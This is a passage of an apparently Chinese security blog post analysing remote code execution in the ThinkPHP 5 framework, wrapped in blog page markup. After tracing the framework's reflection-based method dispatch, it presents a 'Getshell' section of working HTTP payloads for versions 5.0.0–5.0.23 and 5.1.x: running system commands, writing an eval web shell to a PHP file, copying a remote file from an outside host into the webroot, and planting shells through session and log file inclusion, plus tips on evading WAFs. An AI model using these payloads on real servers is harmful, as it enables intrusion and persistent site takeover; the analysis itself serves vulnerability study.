+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 静态方法</span>
+            <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token variable">$args</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">bindParams</span><span class="token punctuation">(</span><span class="token variable">$reflect</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$debug</span> <span class="token operator">&amp;&amp;</span> Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string">'[ RUN ] '</span> <span class="token punctuation">.</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token string">'->'</span> <span class="token punctuation">.</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">'[ '</span> <span class="token punctuation">.</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">' ]'</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invokeArgs</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$class</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>在<code>invokeMethod()</code>中，创建反射方法<code>$reflect = new \ReflectionMethod($class, $method[1]);</code>，获取反射函数<code>$args = self::bindParams($reflect, $vars);</code>，接着记录日志后调用<code>$reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);</code>反射调用<code>模块/控制器/操作</code>中的<code>操作</code>。</p>
+<p>到这里整个流程我们已经结束结束了。我们在<code>thinkphp/library/think/App.php</code>下写一个方法做一个实验</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>直接从web进行访问:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214172743470.png" alt=""></p>
+<p>可以成功访问到任意类中的方法。</p>
+<p>然后我们查看网上该版本最流行的一条payload:</p>
+<pre><code>http://easy.test/thinkphp_5.0.22_with_extend_3/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</code></pre><p>调用的是<code>thinkphp/library/think/App.php</code>下的<code>invokefunction</code>方法。我们更进看看:</p>
+<pre class=" language-php"><code class="language-php">    <span class="token comment" spellcheck="true">/**
+     * 执行函数或者闭包方法 支持参数调用
+     * @access public
+     * @param string|array|\Closure $function 函数或者闭包
+     * @param array                 $vars     变量
+     * @return mixed
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">invokeFunction</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>ReflectionFunction</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$args</span>    <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">bindParams</span><span class="token punctuation">(</span><span class="token variable">$reflect</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 记录执行信息</span>
+        self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$debug</span> <span class="token operator">&amp;&amp;</span> Log<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string">'[ RUN ] '</span> <span class="token punctuation">.</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$reflect</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invokeArgs</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>从thinkphp官方注释大家都应该已经看懂该方法怎么利用了。这里就不多说了。</p>
+<h2 id="Getshell方法总结"><a href="#Getshell方法总结" class="headerlink" title="Getshell方法总结"></a>Getshell方法总结</h2><h3 id="通用payload"><a href="#通用payload" class="headerlink" title="通用payload"></a>通用payload</h3><p>参考泡泡师傅的payload:<a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></p>
+<p><strong>版本:ThinkPHP 5.0.0~5.0.23</strong></p>
+<pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>当然为了更好的检测漏洞不被waf拦截个人更推荐使用var_dump等不敏感的函数进行检测如:</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>var_dump<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">233</span></code></pre>
+<p><strong>5.1.x php版本&gt;5.5</strong></p>
+<pre class=" language-php"><code class="language-php">tp<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/index.php?s=index/think\request/input?data[]=23333&amp;filter=var_dump</span>
+
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</span>
+
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?></span></code></pre>
+<p>更进详细的payload可以参考:<a href="https://y4er.com/post/thinkphp5-rce/#%E5%8F%82%E8%80%83" target="_blank" rel="noopener">https://y4er.com/post/thinkphp5-rce/#%E5%8F%82%E8%80%83</a></p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><h4 id="直接使用echo写"><a href="#直接使用echo写" class="headerlink" title="直接使用echo写"></a>直接使用echo写</h4><pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;%3C?php%20@eval($_POST%5Bcaidao%5D)?%3E&quot; &gt; 2.php</code></pre><h4 id="copy函数"><a href="#copy函数" class="headerlink" title="copy函数"></a>copy函数</h4><p>如果对方过滤一些php标签也可以利用该方法Getshell</p>
+<pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]=http://xxx/git.php&amp;vars[1][1]=233.php</code></pre><p><img src="https://picbed.easy233.top//imgimage-20201214192737971.png" alt=""></p>
+<h4 id="包含session进行Getshell"><a href="#包含session进行Getshell" class="headerlink" title="包含session进行Getshell"></a>包含session进行Getshell</h4><p>首先通过phpinfo首先<code>session.save_path</code>查看session的路径。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214193823816.png" alt=""></p>
+<p><code>session.save_path</code>如果为空在linux下默认在/tmp下。</p>
+<p>然后创建一个<code>session</code></p>
+<pre><code>POST /?s=captcha HTTP/1.1
+Cookie: PHPSESSID=kking</code></pre><p>写shell到session中</p>
+<pre class=" language-php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>think\<span class="token package">Session</span><span class="token punctuation">:</span><span class="token punctuation">:</span>set<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span></code></pre>
+<p><img src="https://picbed.easy233.top//imgimage-20201214194356829.png" alt=""></p>
+<p>包含Session</p>
+<pre class=" language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>captcha
+
+_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>think\<span class="token package">__include_file</span><span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>E<span class="token punctuation">:</span>\<span class="token package">phpstudy<span class="token punctuation">\</span>PHPTutorial<span class="token punctuation">\</span>tmp<span class="token punctuation">\</span>tmp<span class="token punctuation">\</span>sess_kking</span><span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>x<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h4 id="包含日志Getshell"><a href="#包含日志Getshell" class="headerlink" title="包含日志Getshell"></a>包含日志Getshell</h4><pre><code>写shell进日志
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;
+
+通过日志包含getshell
+_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202012/14.log&amp;x=phpinfo();</code></pre><p>thinkphp的rce后可以利用的点非常的多也非常的灵活，能够Getshell的方法远不止上面这几种。</p>
+<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>终于写完了自已其实对thinkphp5的理解不够深刻，若分析存在那些错误希望各位师傅看到了帮忙指正，感谢！</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/6106#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106#toc-3</a></p>
+<p><a href="https://dev-preview.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html" target="_blank" rel="noopener">https://dev-preview.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html</a></p>
+<p><a href="https://y4er.com/post/thinkphp5-rce/#%E5%8F%82%E8%80%83" target="_blank" rel="noopener">https://y4er.com/post/thinkphp5-rce/#%E5%8F%82%E8%80%83</a></p>
+<p><a href="https://y4er.com/post/thinkphp5-source-read/" target="_blank" rel="noopener">https://y4er.com/post/thinkphp5-source-read/</a></p>
+<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
+<p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">EASY</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.easy233.top/2020/12/11/thinkphp5-rce-zong-jie/">https://www.easy233.top/2020/12/11/thinkphp5-rce-zong-jie/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">EASY</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">代码审计</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/12/11/thinkphp5-rce-zong-jie/">
+                    <div class="card-image">
+                        
+                        <img src="https://picbed.easy233.top//imgimage-20201213171617698.png" class="responsive-img" alt="Thinkphp5 RCE 分析">
+                        
+                        <span class="card-title">Thinkphp5 RCE 分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言开始前可以看一下大佬的Thinkphp5 源码阅读 了解thinkphp5的基本运行流程。
+thinphp的rce方法在不同版本利用方式不同，但主要的rce原因有两个:
+
+thinkphp/library/think/Request.p
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            EASY
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/12/08/thinkphp3-lou-dong-zong-jie/">
+                    <div class="card-image">
+                        
+                        <img src="https://picbed.easy233.top//imgimage-20201208165651928.png" class="responsive-img" alt="Thinkphp3 漏洞总结">
+                        
+                        <span class="card-title">Thinkphp3 漏洞总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            基础在开始前可以看看下面三篇文章了解thinkphp3.2.3
+
+Thinkphp3 开发手册
+Thinkphp3.2.3 安全开发须知
+ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法
+
+环境准备测试thinkphp版
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            EASY
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞分析</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="3019282646"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">EASY</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "6";
+                    var startDate = "18";
+                    var startHour = "20";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/EASY233" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2410895493@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2410895493" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2410895493" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
